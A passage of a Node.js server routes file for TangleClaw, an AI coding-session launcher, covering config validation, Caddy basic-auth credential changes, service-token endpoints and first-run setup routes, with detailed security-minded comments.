    if (key === 'chimeMuted' && typeof value !== 'boolean') {
      return errorResponse(res, 400, 'chimeMuted must be a boolean', 'BAD_REQUEST');
    }
    if (key === 'portScannerEnabled' && typeof value !== 'boolean') {
      return errorResponse(res, 400, 'portScannerEnabled must be a boolean', 'BAD_REQUEST');
    }
    if (key === 'portScannerIntervalMs') {
      if (typeof value !== 'number' || value < 10000 || value > 600000) {
        return errorResponse(res, 400, 'portScannerIntervalMs must be a number between 10000 and 600000', 'BAD_REQUEST');
      }
    }

    if (key === 'httpsEnabled' && typeof value !== 'boolean') {
      return errorResponse(res, 400, 'httpsEnabled must be a boolean', 'BAD_REQUEST');
    }
    // Only a real boolean opens the door — a truthy string from a hand-edited
    // config or a sloppy client must not widen the bind by accident.
    if (key === 'bindAllInterfaces' && typeof value !== 'boolean') {
      return errorResponse(res, 400, 'bindAllInterfaces must be a boolean', 'BAD_REQUEST');
    }
    if (key === 'ingressMode' && !validIngressModes.includes(value)) {
      return errorResponse(res, 400, `ingressMode must be one of: ${validIngressModes.join(', ')}`, 'BAD_REQUEST');
    }
    if (key === 'publicDomain' && value !== null && typeof value !== 'string') {
      return errorResponse(res, 400, 'publicDomain must be a string or null', 'BAD_REQUEST');
    }
    if ((key === 'caddyHttpsPort' || key === 'caddyHttpPort')) {
      if (typeof value !== 'number' || !Number.isInteger(value) || value < 1 || value > 65535) {
        return errorResponse(res, 400, `${key} must be an integer between 1 and 65535`, 'BAD_REQUEST');
      }
    }
    if (key === 'stripAiCoauthors' && typeof value !== 'boolean') {
      return errorResponse(res, 400, 'stripAiCoauthors must be a boolean', 'BAD_REQUEST');
    }
    if ((key === 'httpsCertPath' || key === 'httpsKeyPath') && value !== null && typeof value !== 'string') {
      return errorResponse(res, 400, `${key} must be a string or null`, 'BAD_REQUEST');
    }
    // AUTH-2 — basic_auth gate config.
    // AUTH-4 — M2M service-token gate master switch. The raw `serviceToken` is
    // NOT patchable here (managed via the rotate endpoint + auto-generation);
    // only the enable flag is operator-settable.
    if (key === 'serviceTokenEnabled' && typeof value !== 'boolean') {
      return errorResponse(res, 400, 'serviceTokenEnabled must be a boolean', 'BAD_REQUEST');
    }
    // Normalize empty-string cert paths to null so persisted shape matches /api/setup/complete
    let storedValue = value;
    if ((key === 'httpsCertPath' || key === 'httpsKeyPath' || key === 'publicDomain')
        && (value === '' || value === null)) {
      storedValue = null;
    }

    if (key === 'serverPort' || key === 'ttydPort' || key === 'httpsEnabled' || key === 'httpsCertPath' || key === 'httpsKeyPath' || key === 'ingressMode' || key === 'bindAllInterfaces') {
      if (config[key] !== storedValue) requiresRestart = true;
    }

    // Hash deletePassword before persisting
    if (key === 'deletePassword' && storedValue !== null) {
      config[key] = projects.hashPassword(storedValue);
    } else {
      config[key] = storedValue;
    }
  }

  // Validate HTTPS cert pair when HTTPS is enabled (mirrors /api/setup/complete).
  // Allow httpsEnabled=true with no cert paths — createServer() will log and fall
  // back to HTTP gracefully so existing installs don't break on upgrade.
  if (config.httpsEnabled && config.httpsCertPath && config.httpsKeyPath) {
    const validation = httpsSetup.validateCertFiles(config.httpsCertPath, config.httpsKeyPath);
    if (!validation.ok) {
      return errorResponse(res, 400, `HTTPS cert validation failed: ${validation.error}`, 'BAD_REQUEST');
    }
  } else if (config.httpsEnabled && (config.httpsCertPath || config.httpsKeyPath)) {
    return errorResponse(res, 400, 'Both httpsCertPath and httpsKeyPath are required when HTTPS is enabled with cert paths', 'BAD_REQUEST');
  }

  // The AUTH-2 both-or-neither check that used to sit here is gone with the fields
  // it guarded. This route no longer accepts authEnabled/basicAuthUser/
  // basicAuthHash at all — it refuses them above — so no request reaching this
  // line can create the half-credential state, and the check could only ever fire
  // on a config that was ALREADY inconsistent on disk. There it did harm: it
  // rejected every unrelated write (a theme, a port) with an instruction to send
  // credential fields this same route refuses, which is an error with no exit.
  // The invariant is enforced where the fields are now written — POST
  // /api/auth/credential, first-run setup, and scripts/reset-admin.js — and by
  // buildCaddyfileContent's own guard at generation.

  // AUTH-4 — enabling the M2M gate auto-generates a fleet token on first enable,
  // so the config can never hold serviceTokenEnabled=true with a null token (the
  // fail-closed state the gate would otherwise 500 on). The invariant lives in
  // one place (service-token.ensureTokenWhenEnabled) shared with the rotate
  // endpoint — see [[feedback_symmetric_capability_gates]]. The token is retained
  // (inert) on disable so re-enabling is stable. Logged without the secret.
  if (serviceToken.ensureTokenWhenEnabled(config)) {
    log.info('AUTH-4 service token auto-generated on enable');
  }

  // The wizard's "Skip" closes setup via PATCH { setupComplete: true }, so this
  // path must honor the SAME rule as /api/setup/complete or Skip is a way past the
  // login gate. That rule is no longer "are we in caddy mode" — it is "can this
  // machine enforce a credential", asked of the one derivation both routes share.
  // Gating on `ingressMode === 'caddy'` here left the default fresh install
  // (direct mode, caddy installed) able to finish setup with no login at all,
  // which is the entire defect the sibling route was changed to close.
  //
  // Same reasoning for the engine requirement, and the same sibling trap: Skip
  // closes setup here, so a rule enforced only on /api/setup/complete is a rule
  // with a door beside it. An install that finishes with no engine is a
  // dashboard that can launch nothing.
  //
  // Guarded only on the explicit transition, and only while setup is still
  // open: re-saving settings on a finished install must never be refused
  // because an engine was uninstalled later.
  if (body.setupComplete === true && wasSetupOpen) {
    if (!await engines.anyEngineInstalled()) {
      return errorResponse(res, 400,
        'No AI engine is installed, so there would be nothing to launch. Install one '
        + '(Claude Code, Codex, Aider or Antigravity), then press Check again.',
        'ENGINE_REQUIRED');
    }
  }

  // Only the explicit complete-setup transition is guarded, so unrelated PATCHes
  // are never blocked.
  if (body.setupComplete === true
      && !(config.authEnabled && config.basicAuthUser && config.basicAuthHash)) {
    const skipState = caddy.classifyIngressState();
    const skipPlan = ingressProvision.decideProvisioning({
      state: skipState.state,
      safeToWrite: skipState.safeToWrite,
      caddyAvailable: caddy.detectCaddy().available,
      ingressMode: config.ingressMode,
      user: skipState.user
    });
    if (config.ingressMode === 'caddy' || skipPlan.action === 'provision') {
      return errorResponse(res, 400,
        'Cannot finish setup without an admin credential — TangleClaw puts a login in front of itself '
        + 'by default, and this machine can run one.',
        'ADMIN_REQUIRED');
    }
  }

  store.config.save(config);

  // Restart or stop port scanner if settings changed
  if ('portScannerEnabled' in body || 'portScannerIntervalMs' in body) {
    portScanner.stopScanner();
    if (config.portScannerEnabled) {
      portScanner.startScanner(config.portScannerIntervalMs);
    }
  }

  // #247 — toggling stripAiCoauthors re-syncs the commit-msg hook across
  // EVERY registered project (including archived ones — Critic flagged
  // that filtering on `{archived: false}` would leave orphan hooks on
  // archived projects after a toggle-OFF). Symmetric with the install
  // path: turn ON → install everywhere a `.git/` exists; turn OFF →
  // uninstall everywhere (drift-aware — foreign hooks are preserved by
  // syncGitHooks). Gated on actual value change so a Save click that
  // didn't touch this toggle doesn't trigger an N-project filesystem
  // walk (#247 hardening).
  if ('stripAiCoauthors' in body && body.stripAiCoauthors !== oldStripAiCoauthors) {
    const all = store.projects.list(); // no archived filter — see above
    for (const project of all) {
      if (!project.path) continue;
      try {
        gitHooks.syncGitHooks(project.path, config);
      } catch (err) {
        log.warn('Failed to sync git hooks after stripAiCoauthors toggle', {
          project: project.name, error: err.message
        });
      }
    }
    // #252 — also flip the global git template so non-TC-managed repos
    // pick the hook up on next `git init` / `git clone`. Independent of
    // the per-project walk above: the template covers FUTURE repos
    // anywhere on the host; the per-project loop covers EXISTING
    // TC-managed repos. Both must run on every toggle.
    try {
      gitTemplate.syncGlobalTemplate(config);
    } catch (err) {
      log.warn('Failed to sync global git template after stripAiCoauthors toggle', {
        error: err.message
      });
    }
  }

  // Build redacted response — strip credential hashes (deletePassword,
  // basicAuthHash) — and re-resolve the bind state so the UI re-renders the
  // Network Exposure control from the server's answer, not its own guess.
  const redacted = _withBindState(config);

  jsonResponse(res, 200, { ok: true, config: redacted, requiresRestart });
});

// AUTH-4b — service-token management. These are OPERATOR endpoints (gated by
// basic_auth in caddy mode / localhost-only in direct mode, like the rest of
// /api), deliberately OUTSIDE the M2M-gated path set — a service caller holding
// the token must not be able to reveal or rotate its own gate credential.

// GET /api/auth/credential — what the settings surface may offer, and why not.
//
// Answered BEFORE the operator types anything, so the form is never rendered for
// an install that cannot use it. The refusal reasons are the same ones the POST
// returns, from the same predicate, so the two can never disagree about a machine
// between rendering the form and submitting it — the failure this chunk's sibling
// (the wizard step list) already had to fix once.
route('GET', '/api/auth/credential', (req, res) => {
  const config = store.config.load();
  const ingressState = caddy.classifyIngressState();
  const check = adminCredential.canChangeCredential(
    config, ingressState, caddy.detectCaddy().available,
    adminCredential.isLoopbackRemote(req.socket && req.socket.remoteAddress));
  jsonResponse(res, 200, {
    changeable: check.allowed,
    // Same spelling the POST's refusal uses, from the same translator — a client
    // comparing the two must never see one state under two names.
    code: adminCredential.httpCode(check.code),
    reason: check.reason,
    remedy: check.remedy,
    // The username currently in force, read from the FILE rather than from
    // config, because the change itself resolves its target from the file and the
    // two can drift (ADR 0009's amendment names that state). Showing config's
    // copy would name one account in the form and re-hash a different one.
    // Never the hash: it is a credential, and the redacted config API withholds
    // it for the same reason.
    user: check.allowed ? ingressState.user : null
  });
});

// POST /api/auth/credential — change the admin username/password after setup.
//
// The ONLY route that writes a credential outside first-run setup and the
// terminal recovery tool. `PATCH /api/config` deliberately no longer accepts
// these fields: a guarded front door beside an unguarded side one is not a gate,
// and that side door was reachable unauthenticated on an ungated install.
//
// It may CHANGE a credential and never create or blank one. Creating is recovery
// and belongs at a terminal, because a reset that lives behind the gate cannot
// help someone the gate has locked out; blanking would be a second route to "no
// password", and the Direction allows exactly one.
//
// There is no "current password" field, and its absence is a finding rather than
// an oversight: `caddy hash-password` has no verify mode and no `--salt`, so a
// stored bcrypt hash cannot be reproduced for comparison, and Node's stdlib has
// no bcrypt. The server cannot check a typed current password, and a field that
// does not verify is theatre. What authenticates this request is that Caddy
// already did — which is exactly why the guard below refuses whenever no gate is
// in force.
route('POST', '/api/auth/credential', (req, res, _params, body) => {
  // parseBody resolves null for an empty request, so every field read below would
  // throw on a bodyless POST — a 500 that reads as "the server broke" for what is
  // simply a malformed request.
  const payload = body || {};
  const config = store.config.load();
  const ingressState = caddy.classifyIngressState();
  // Both routes ask the same predicate the same way, including the socket — a
  // GET that discloses the username to a caller the POST would refuse is the
  // client-vs-server disagreement this surface already had to fix once.
  const check = adminCredential.canChangeCredential(
    config, ingressState, caddy.detectCaddy().available,
    adminCredential.isLoopbackRemote(req.socket && req.socket.remoteAddress));
  if (!check.allowed) {
    return errorResponse(res, 409, `${check.reason} ${check.remedy}`, adminCredential.httpCode(check.code));
  }

  // The username is NOT changeable here, and the field is read-only in the UI for
  // the same reason: `caddy.replaceBasicAuthCredential` takes a username as a
  // SELECTOR of which credential line to re-hash, and writes back the matched
  // name. A rename would therefore leave the gate on the old username while config
  // recorded the new one — a config-vs-gate divergence, which is the failure this
  // whole chunk exists to prevent. Renaming is a `reset-admin.js` job.
  //
  // Resolved from the LIVE FILE rather than from config, because those two drift
  // (ADR 0009's amendment names that state) and the file is what the gate
  // enforces. A caller sending a different name is refused, not obeyed.
  const user = typeof payload.user === 'string' ? payload.user.trim() : '';
  if (payload.user !== undefined && !user) {
    return errorResponse(res, 400, 'A username is required', 'BAD_REQUEST');
  }
  const password = typeof payload.password === 'string' ? payload.password : '';
  // Validated against the username IN FORCE, not the one the caller sent. The UI
  // deliberately sends no `user` — the field is read-only and the server resolves
  // the target itself — so validating against the request's copy left the
  // no-username-in-password rule inert on every request the product actually
  // makes. Setup enforces that rule; a change surface that did not would let the
  // rule be escaped simply by changing the password afterwards.
  //
  // From the FILE, for the same reason the GET reads the file: config and the
  // live gate drift (ADR 0009's amendment names that state), and the guard above
  // requires both to be non-empty without requiring them to AGREE. Taking
  // config's copy would check the password against a name that is not the login
  // in force — accepting, in exactly the drift case, a password containing the
  // real username that setup would have refused.
  const pwCheck = caddy.validateAdminPassword(password, user || ingressState.user);
  if (!pwCheck.ok) {
    return errorResponse(res, 400, pwCheck.error, 'BAD_REQUEST');
  }

  let hash;
  try {
    hash = caddy.hashPassword(password);
  } catch (err) {
    // Never the plaintext; the message is the caddy failure, not the secret.
    log.error('Admin credential hashing failed', { error: err.message });
    return errorResponse(res, 500, `Could not hash the password: ${err.message}`, 'HASH_FAILED');
  }

  const result = adminCredential.applyCredentialChange({
    caddyfilePath: caddy.getCaddyfilePath(),
    // Undefined when the caller sent none: the module then resolves the single
    // credential in the file itself.
    user: user || undefined,
    hash,
    uid: process.getuid(),
    stamp: new Date().toISOString().replace(/[:.]/g, '-'),
    // The reply to this request travels back through the very Caddy that has to
    // restart, so restarting it first tears down the connection carrying the
    // reply: the change succeeds and the browser is told the network failed.
    // Deferred to after the response is flushed, below.
    reload: false
  });

  if (result.code === adminCredential.CREDENTIAL_CODES.RENAME_UNSUPPORTED) {
    // Nothing was written. Says which name IS in force, because the caller's whole
    // problem is that it disagrees with what they sent.
    return errorResponse(res, 400,
      `The username cannot be changed here — ${result.error}. `
      + 'Run `node scripts/reset-admin.js` at a terminal to change it.',
      adminCredential.httpCode(result.code));
  }
  if (result.code === adminCredential.CREDENTIAL_CODES.DIVERGED) {
    // The gate carries the NEW password and config still records the old one, and
    // the restore that should have undone it failed too. Says which password is
    // live, because that is the one thing the operator needs in the next minute.
    log.error('Admin credential change left the gate and config disagreeing',
      { error: caddy.redactHashes(result.error) });
    return errorResponse(res, 500,
      'The new login was written to Caddy but could not be recorded, and the previous '
      + 'Caddy config could not be put back. The NEW password is the one in force. '
      + 'Run `node scripts/reset-admin.js` at a terminal on this machine to settle it.',
      adminCredential.httpCode(result.code));
  }
  if (result.code === adminCredential.CREDENTIAL_CODES.GATE_BROKEN) {
    // The credential did not change — but the write that failed could not be
    // undone either, so the live Caddyfile is whatever it left behind and may not
    // load. "Nothing was changed" would be true about the password and dangerously
    // misleading about the ingress, on the one path where the operator is about to
    // lose the dashboard entirely.
    log.error('The Caddyfile could not be written or restored; the live gate may be broken',
      { error: caddy.redactHashes(result.error), backup: result.backup });
    return errorResponse(res, 500,
      'Your login was NOT changed, but the Caddy config could not be written or put back, so the '
      + `ingress may now be broken. A copy of the original is at ${result.backup} — restore it at a `
      + 'terminal on this machine, or run `node scripts/reset-admin.js`.',
      adminCredential.httpCode(result.code));
  }
  if (!result.ok) {
    // The gate and the recorded credential are both untouched — applyCredentialChange
    // restores the original before returning, whether the write was rejected by
    // `caddy validate` or the config could not be recorded afterwards. Redacted
    // for the same reason the cutover's is: `caddy validate` output quotes the
    // offending line, and that line carries a hash.
    log.warn('Admin credential change did not complete; nothing was changed',
      { code: result.code, error: caddy.redactHashes(result.error) });
    // Three failures that all leave the login unchanged, said three ways, because
    // they send the operator to three different places. Blaming Caddy's parser
    // for a full disk is a false report of the same family as the rest.
    const CODES = adminCredential.CREDENTIAL_CODES;
    const detail = {
      [CODES.CONFIG_WRITE_FAILED]: 'The new login could not be recorded, so nothing was changed.',
      [CODES.WRITE_FAILED]: 'The Caddy config could not be written, so nothing was changed. '
        + 'This is usually a full disk or a permissions problem, not the password.'
    }[result.code] || 'The new login was rejected by Caddy, so nothing was changed.';
    return errorResponse(res, 400, detail, adminCredential.httpCode(result.code));
  }

  log.info('Admin credential changed; reloading Caddy once this response is out',
    { user: result.user });

  // The restart is hung off `finish` — after the response has left this process —
  // and never before it. What cannot be reported is the reload's OUTCOME: by the
  // time it is known, every further request needs the new password, so there is no
  // response left to carry it. That is why `reloadCommand` ships unconditionally
  // rather than only on failure: it is the operator's recourse for the one case
  // this route cannot tell them about, a restart that did not happen.
  // Asynchronous, because a synchronous restart here holds the event loop for as
  // long as launchd takes — every unrelated request queued behind a Caddy restart.
  // `close`, not `finish`: finish fires only when the response was fully sent, so
  // a client that aborts mid-reply would leave the credential changed on disk and
  // Caddy never reloaded — the old password still opening the door, with nothing
  // reporting it. close fires either way, and after finish when both do.
  res.on('close', () => {
    adminCredential.reloadCaddyAsync(process.getuid(), (reload) => {
      if (reload.ok) {
        log.info('Caddy reloaded; the new login is in force');
      } else {
        log.error('Caddy could not be reloaded, so the OLD login is still in force',
          { error: reload.error, reloadCommand: reload.command });
      }
    });
  });

  jsonResponse(res, 200, {
    ok: true,
    // The name the GATE carries, which is authoritative — not the one that was sent.
    user: result.user,
    // The change is on disk and Caddy restarts as this response leaves, so the
    // next request is challenged. Unconditional now, and honestly so: it is a
    // statement about what has been done, not a claim about a restart this
    // response is racing.
    signedOut: true,
    // What to run if the sign-in prompt never comes — the only symptom the
    // operator can observe of a reload that failed after this reply was sent.
    reloadCommand: result.reloadCommand
  });
});

// GET /api/service-token — reveal the raw fleet token for the Settings
// "reveal" display. 404 when the gate is off or no token is set (nothing to
// reveal); the redacted config API never carries the raw value.
route('GET', '/api/service-token', (_req, res) => {
  const config = store.config.load();
  if (!config.serviceTokenEnabled || !config.serviceToken) {
    return errorResponse(res, 404, 'No service token is configured', 'NO_SERVICE_TOKEN');
  }
  jsonResponse(res, 200, { token: config.serviceToken });
});

// POST /api/service-token/rotate — generate + persist a NEW fleet token and
// return it. Only meaningful while the gate is active, so guard on enabled
// (mirrors reveal). Re-injected into every project at the next session launch;
// live sessions holding the old token break until relaunch — documented.
route('POST', '/api/service-token/rotate', (_req, res) => {
  const config = store.config.load();
  if (!config.serviceTokenEnabled) {
    return errorResponse(res, 409, 'Enable the service token gate before rotating', 'SERVICE_TOKEN_DISABLED');
  }
  config.serviceToken = serviceToken.generateToken();
  store.config.save(config);
  log.info('AUTH-4 service token rotated');
  jsonResponse(res, 200, { token: config.serviceToken });
});

// GET /api/setup/https-check — Detect mkcert availability for the wizard
route('GET', '/api/setup/https-check', (_req, res) => {
  const detection = httpsSetup.detectMkcert();
  const caInstalled = detection.available ? httpsSetup.isCaInstalled(detection.carootPath) : false;
  jsonResponse(res, 200, {
    mkcert: {
      available: detection.available,
      version: detection.version,
      carootPath: detection.carootPath,
      caInstalled,
      error: detection.error
    },
    certsDir: httpsSetup.getCertsDir()
  });
});

// GET /api/setup/ingress-state — What the wizard is allowed to do about a login.
//
// Two facts the wizard needs before it can offer to put a gate in front of this
// install: whether Caddy is installed at all, and whether a Caddy config already
// exists that a human maintains. Detection only — this never writes the
// Caddyfile, never reloads, and never provisions; it is the sibling of
// /api/setup/https-check, which reports on mkcert the same way.
//
// Deliberately narrower than `classifyIngressState` returns. The credential hash
// never crosses the boundary, and the raw user list is reduced to a count.
//
// The one username this can disclose is released only while `setupComplete` is
// false. The wizard needs it for a single sentence — "keeping your existing
// login for <user>" — and that sentence is only ever shown during setup. Once
// setup is finished the name is withheld, because in direct mode this route
// answers with no gate in front of it and an installed, running TangleClaw
// should not hand out an account name for the asking. The state and the count
// still answer honestly, which is all any later caller needs.
// `plan` is the wizard's step-list decision, derived HERE and never in the
// browser. Whether the admin step appears is a security decision — a duplicate
// of the six-state table in public/setup.js could drift from this one and start
// collecting a credential nothing enforces. The wizard branches on
// `plan.action` alone.
route('GET', '/api/setup/ingress-state', (_req, res) => {
  const config = store.config.load();
  const duringSetup = config.setupComplete === false;
  const detection = caddy.detectCaddy();
  const state = caddy.classifyIngressState();
  const plan = ingressProvision.decideProvisioning({
    state: state.state,
    safeToWrite: state.safeToWrite,
    caddyAvailable: detection.available,
    ingressMode: config.ingressMode,
    user: duringSetup ? state.user : null
  });
  jsonResponse(res, 200, {
    state: state.state,
    safeToWrite: state.safeToWrite,
    user: duringSetup ? state.user : null,
    userCount: state.users.length,
    caddy: {
      available: detection.available,
      version: detection.version || null,
      error: detection.error || null
    },
    plan: {
      action: plan.action,
      reason: plan.reason,
      remedy: plan.remedy
    }
  });
});

// GET /api/setup/provision-status — how the ingress cutover the wizard started
// ended, once it has ended.
//
// The cutover restarts this server, so it runs as a detached child and reports
// through a file rather than a return value (see lib/ingress-provision.js). This
// route is the read side of that channel.
//
// It deliberately needs no Caddy auth-bypass entry: pre-cutover the wizard is
// served by TangleClaw directly, and the cutover does not move TangleClaw's
// listen port — so a poll from that page never traverses the perimeter. What the
// cutover DOES change is the protocol and the interface, which is why the wizard
// must also handle its own origin disappearing (an operator who reached setup
// over direct HTTPS, or over a LAN address, loses it at the restart).
//
// Nothing secret crosses this boundary, and that is enforced by what is BUILT
// rather than by what the child happened to write. The response is exactly:
// `state`, `ok`, `code`, `target`, `healthOk`, `hasError`, `logLocation` (a
// RELATIVE path — the resolved one names the OS account) and `finishedAt`.
// The child's free-text `error` is
// deliberately NOT forwarded — its producer fills that field with absolute
// filesystem paths (an unreadable Caddyfile names its path, a backup names its
// path, `caddy validate` stderr names the config and can quote the offending
// line), and this route has no `setupComplete` gate in front of it. The detail is
// not lost: it goes to the server log and to the cutover's own log file, where an
// operator can read it and a stranger cannot.
route('GET', '/api/setup/provision-status', (_req, res) => {
  const { present, malformed, result } = ingressProvision.readResult();
  if (!present) {
    // Not "failed" — the child may still be running, or may never have started.
    // The wizard distinguishes those by its own deadline, not by this answer.
    //
    // `logLocation` rides along even here, because the case it serves is the one
    // where no better answer ever arrives: a child that dies between writing the
    // plists and calling finish() leaves NO result file, so every poll gets this
    // response until the wizard's deadline expires and it renders the crash
    // screen. The log is then the only durable evidence of what happened, and
    // without this the screen has no name to give for it. It discloses nothing —
    // the constant is a relative path, chosen so it never names the OS account.
    return jsonResponse(res, 200, {
      state: 'pending', ok: null, code: null,
      logLocation: ingressProvision.CUTOVER_LOG_RELATIVE
    });
  }
  if (malformed) {
    // `unparseable-result`, not `unreadable`: this surface already uses
    // `unreadable` for a Caddyfile that cannot be read, and one word meaning two
    // unrelated conditions on the same endpoint family is how a caller ends up
    // answering the wrong one.
    log.warn('Ingress cutover wrote an outcome file that could not be parsed',
      { path: ingressProvision.resultPath() });
    return jsonResponse(res, 200, {
      state: 'unparseable-result',
      ok: null,
      code: null,
      hasError: true,
      logLocation: ingressProvision.CUTOVER_LOG_RELATIVE
    });
  }
  if (result.ok !== true && typeof result.error === 'string' && result.error) {
    // Logged, not returned. This is the operator's copy of the detail the
    // response withholds — but "withheld from the response" is not the same as
    // "safe to log": on the validate-failed path this string is `caddy validate`
    // stderr, which quotes the offending Caddyfile line, and that line is
    // `basic_auth <user> <bcrypt-hash>`. observability-strategy.md forbids
    // passwords hashed or plaintext at any level, so it is redacted here rather
    // than trusted to be hash-free.
    log.warn('Ingress cutover reported a failure',
      { code: result.code || null, error: caddy.redactHashes(result.error) });
  }
  jsonResponse(res, 200, {
    state: 'done',
    ok: result.ok === true,
    code: typeof result.code === 'string' ? result.code : null,
    target: typeof result.target === 'string' ? result.target : null,
    healthOk: typeof result.healthOk === 'boolean' ? result.healthOk : null,
    // `hasError` rather than the message: enough for the wizard to say the
    // cutover reported a reason and name where to read it.
    hasError: typeof result.error === 'string' && result.error.length > 0,
    // A RELATIVE location, not the resolved path. Returning
    // `cutoverLogPath()` here would have re-introduced the disclosure this route
    // just removed — `/Users/<name>/…` names the OS account, on an endpoint with
    // no setupComplete gate. The operator knows where their own home directory is.
    logLocation: ingressProvision.CUTOVER_LOG_RELATIVE,
    finishedAt: typeof result.finishedAt === 'string' ? result.finishedAt : null
  });
});

// POST /api/setup/generate-cert — Run mkcert to produce cert.pem + key.pem
// Valid host: letters/digits/dots/colons/hyphens, not starting with '-' so mkcert
// can't mistake it for a flag. Max length 253 per RFC 1035 (plus IPv6 colons).
const HOST_RE = /^[A-Za-z0-9]([A-Za-z0-9.\-:]{0,252})$/;
route('POST', '/api/setup/generate-cert', (_req, res, _params, body) => {
  let hosts;
  if (body && body.hosts !== undefined) {
    if (!Array.isArray(body.hosts) || body.hosts.length === 0) {
      return errorResponse(res, 400, 'hosts must be a non-empty array of strings', 'BAD_REQUEST');
    }
    for (const h of body.hosts) {
      if (typeof h !== 'string' || !HOST_RE.test(h)) {
        return errorResponse(res, 400, `Invalid host: ${JSON.stringify(h)}`, 'BAD_REQUEST');
      }
    }
    hosts = body.hosts;
  }

  let result;
  try {
    // Regeneration is ADDITIVE here too. Nothing records the host list a cert was
    // minted with, so the cert is its own only record — and this route's shipped
    // caller (`public/setup.js`, the "Generate Certificates" button) sends `{}`,
    // no hosts at all. Generating from the defaults therefore dropped every name
    // added earlier, including a tailnet FQDN, silently un-covering the tailnet
    // HTTPS site that reuses this same certificate. An explicit `hosts` list is
    // still honoured verbatim: a caller naming its hosts is replacing them on
    // purpose, which is a different intent from the button's "refresh my certs".
    const effectiveHosts = hosts || (() => {
      const existing = httpsSetup.certSanHosts(
        path.join(httpsSetup.getCertsDir(), 'cert.pem'));
      const mdns = httpsSetup.mdnsHostFor(os.hostname());
      const cfg = store.config.load();
      return [...new Set([
        ...existing, ...httpsSetup.MKCERT_HOSTS_DEFAULT, mdns,
        cfg.caddyTailnetHost || null, cfg.publicDomain || null
      ].filter(Boolean))];
    })();
    result = httpsSetup.generateCerts({ hosts: effectiveHosts });
  } catch (err) {
    return errorResponse(res, 500, err.message, 'MKCERT_FAILED');
  }

  jsonResponse(res, 200, {
    ok: true,
    certPath: result.certPath,
    keyPath: result.keyPath,
    hosts: result.hosts,
    expiry: result.expiry,
    remoteTrust: httpsSetup.getRemoteTrustInstructions(result.carootPath)
  });
});

// POST /api/setup/scan — Scan a directory for existing projects
//
// The scan itself lives in lib/projects because it must run off the main thread
// under a deadline: this route reads a directory the operator types in, and the
// value the wizard pre-fills (~/Documents/Projects) is TCC-protected on macOS,
// where a read does not fail — it never returns. Inline and synchronous, that
// blocked the event loop and took the whole server down on the first click of a
// fresh install (#859).
route('POST', '/api/setup/scan', async (_req, res, _params, body) => {
  // An all-whitespace path is not "no path": `path.resolve('')` is the server's
  // own working directory, so without this the wizard would scan the install
  // itself and offer its subdirectories as projects.
  if (!body || typeof body.directory !== 'string' || !body.directory.trim()) {
    return errorResponse(res, 400, 'directory is required', 'BAD_REQUEST');
  }

  const result = await projects.scanDirectoryForProjects(body.directory);
  if (!result.ok) {
    return errorResponse(res, 400, result.error, result.code);
  }

  jsonResponse(res, 200, { projects: result.projects });
});

// POST /api/setup/create-dir — Create the projects directory the operator named.
//
// The shipped default is ~/Documents/Projects and a stock Mac does not have it,
// so the first thing a new install does — accept the pre-filled path, press
// Next — used to answer "Directory does not exist" and stop, with no action
// available anywhere in the product.
//
// Unauthenticated by necessity: this is first-run setup, before any credential
// exists. The constraint in `createProjectsDir` is therefore the boundary — one
// level, inside the operator's home directory — not a stand-in for one.
route('POST', '/api/setup/create-dir', async (_req, res, _params, body) => {
  if (!body || typeof body.directory !== 'string' || !body.directory.trim()) {
    return errorResponse(res, 400, 'directory is required', 'BAD_REQUEST');
  }

  const result = await projects.createProjectsDir(body.directory);
  if (!result.ok) {
    return errorResponse(res, 400, result.error, result.code);
  }

  jsonResponse(res, 200, { ok: true, path: result.path, created: result.created });
});

// POST /api/setup/complete — Batch setup: update config + attach projects
route('POST', '/api/setup/complete', async (req, res, _params, body) => {
  if (!body || typeof body !== 'object') {
    return errorResponse(res, 400, 'Request body must be a JSON object', 'BAD_REQUEST');
  }

  let config = store.config.load();
  const warnings = [];
  // Captured before this handler sets it. Provisioning is a FIRST-RUN action: it
  // rewrites launchd plists and restarts the server, and this route has never
  // required setup to be unfinished. Re-POSTing it on a completed install must
  // therefore not be a way to trigger an ingress cutover — on an install that is
  // ungated and network-reachable (the legacy grace state) that would hand an
  // unauthenticated caller a service restart. Changing the credential on a
  // finished install is a settings action with its own surface, not this one.
  const firstRun = config.setupComplete === false;

  // A login is the DEFAULT outcome of setup, not something that happens only on a
  // machine already running behind Caddy. The same derivation the wizard asked for
  // at GET /api/setup/ingress-state decides what this install can have, so the two
  // cannot disagree about a machine between the step list and the submission:
  //
  //   provision → the wizard collected a credential; persist it, then hand the
  //               cutover to a detached child (it restarts this server, so this
  //               handler cannot run it and live to report the outcome).
  //   adopt     → a working hand-rolled gate is already in front of us; take its
  //               credential into config and never collect a second one.
  //   refuse    → nothing may be written. Finish honestly ungated rather than
  //               storing a credential nothing enforces.
  const ingressDetection = caddy.detectCaddy();
  const ingressState = caddy.classifyIngressState();
  const ingressPlan = firstRun
    ? ingressProvision.decideProvisioning({
      state: ingressState.state,
      safeToWrite: ingressState.safeToWrite,
      caddyAvailable: ingressDetection.available,
      ingressMode: config.ingressMode,
      user: ingressState.user
    })
    // Already-complete install: report the state, act on nothing. `refuse` is the
    // no-op action, so a re-POST persists whatever config fields it carries and
    // leaves the ingress exactly as it found it.
    : { action: 'refuse', reason: 'Setup is already complete, so the ingress was left unchanged.',
      remedy: null, user: null };

  // Adoption happens HERE, before the credential gates below, because it is what
  // supplies the credential in this case. Run after them and a caddy-mode install
  // whose hand-maintained Caddyfile already holds the only login would be refused
  // with ADMIN_REQUIRED — the one shape the adopt path exists to serve.
  //
  // `adoptCredentialIntoConfig` persists its own copy of config, so re-read
  // rather than carrying a stale object forward. Safe at this point precisely
  // because nothing from the request body has been applied yet.
  let adoption = null;
  if (ingressPlan.action === 'adopt') {
    // requireCaddyMode is off because the plan already established that Caddy IS
    // the live ingress — the guard's own question, asked one layer up.
    adoption = caddy.adoptCredentialIntoConfig({ requireCaddyMode: false });
    if (adoption.changed) config = store.config.load();
  }

  // Setup cannot finish with no engine installed. TangleClaw's whole job is
  // launching AI coding sessions, and an install with no engine is a dashboard
  // that can launch nothing — the operator reaches a finished-looking product
  // and discovers the hole at the first Launch button, with nothing on screen
  // explaining it.
  //
  // Refused HERE and not only in the wizard, because the wizard's Next button
  // is not the rule. Anything that POSTs this route — a re-run, a script, a
  // client that skipped the step — must meet the same bar, or the gate is
  // decoration. `feedback_symmetric_capability_gates`: the two surfaces
  // coordinating around one condition have to test the same condition.
  //
  // First run only. A finished install whose engine was later uninstalled is a
  // different problem, and refusing to re-save its settings would strand it.
  // `refresh` because the operator has probably just installed one in another
  // window, which is the entire reason this request is being made again.
